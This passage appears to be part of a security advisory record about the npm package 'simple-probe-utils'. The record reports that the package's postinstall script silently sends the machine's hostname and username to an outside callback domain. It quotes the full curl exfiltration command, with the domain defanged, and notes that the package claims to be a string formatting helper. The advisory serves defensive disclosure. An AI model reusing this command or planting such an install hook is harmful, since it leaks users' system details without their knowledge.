  "summary": "Security-research / proof-of-concept package: simple-probe-utils (npm)",
  "details": "The package runs a postinstall script that executes curl to exfiltrate the system hostname and username to an external callback server. The script at postinstall.js calls exec('curl -s \"hxxp://pzs5w7ntzhsnepwk564lyfdci3oucl0a[.]oastify[.]com/probe?h=$(hostname)\u0026u=$(whoami)\"'), sending the hostname and current user to the interactsh-style domain pzs5w7ntzhsnepwk564lyfdci3oucl0a[.]oastify[.]com via HTTP GET. The package description (\"string formatting helper\") does not match this behaviour.",
